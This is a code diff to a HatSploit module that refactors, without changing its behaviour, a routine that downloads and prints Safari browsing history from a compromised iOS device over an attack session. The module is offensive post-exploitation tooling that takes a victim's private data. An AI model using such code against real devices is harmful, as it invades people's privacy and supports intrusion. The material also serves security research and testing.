@@ -44,8 +44,7 @@ class HatSploitModule(Module, Sessions, DB):
         session, path = self.parse_options(self.options)
         history = '/private/var/mobile/Library/Safari/History.db'
 
-        path = self.session_download(session, history, path)
-        if path:
+        if path := self.session_download(session, history, path):
             self.print_process("Parsing history database...")
 
             try:
@@ -54,11 +53,9 @@ class HatSploitModule(Module, Sessions, DB):
                 self.print_error("Failed to parse history database!")
                 return
 
-            history_data = []
-            for item in history:
-                history_data.append((item['date'], item['details']['url']))
-
-            if history_data:
+            if history_data := [
+                (item['date'], item['details']['url']) for item in history
+            ]:
                 self.print_table("History", ('Date', 'URL'), *history_data)
             else:
                 self.print_warning("No history available on device.")
